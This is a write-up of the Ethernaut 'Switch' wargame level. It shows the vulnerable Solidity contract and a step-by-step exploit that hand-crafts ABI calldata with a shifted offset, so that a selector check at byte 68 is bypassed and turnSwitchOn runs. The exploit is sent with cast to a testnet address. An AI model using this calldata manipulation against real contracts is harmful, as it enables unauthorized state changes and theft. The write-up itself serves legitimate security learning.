---
title: "Switch"
tags: ["calldata"]
reference: https://ethernaut.openzeppelin.com/level/29
---

# Description

Just have to flip the switch. Can't be that hard, right?

Things that might help:

- Understanding how CALLDATA is encoded.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

# Solution

1. get function selectors

```
tim@tim-virtual-machine ~/g/the-ethernaut (main) [2]> cast calldata "turnSwitchOn()"
0x76227e12
tim@tim-virtual-machine ~/g/the-ethernaut (main) [2]> cast calldata "turnSwitchOff()"
0x20606e15
tim@tim-virtual-machine ~/g/the-ethernaut (main) [1]> cast calldata "flipSwitch(bytes)" 0x76227e12
0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
```

2. create update calldata of `flipSwitch` function which change the 

```
0x30c13ade // "flipSwitch" function selector
0000000000000000000000000000000000000000000000000000000000000060 // offset of bytes arugment of flipSwitch function
0000000000000000000000000000000000000000000000000000000000000020 // random bytes, we want "turnSwitchOff" function selector bytes store at 68 position
20606e1500000000000000000000000000000000000000000000000000000000 // "turnSwitchOff" function selector
0000000000000000000000000000000000000000000000000000000000000004 // length of the bytes array, offset is 0x60 (the first 4 byres function selector is ignored)
76227e1200000000000000000000000000000000000000000000000000000000 // "turnSwitchOn" function selector
```

3. test if we can decode the above calldata

```
cast decode-calldata "flipSwitch(bytes)" 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

0x76227e12
```

4. send transaction with our manual crafted calldata

```
cast send 0x1F61cFD1e267ec790257740244E47E3782e93a1f 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 --rpc-url $BASE_SEPOLIA_RPC 
```
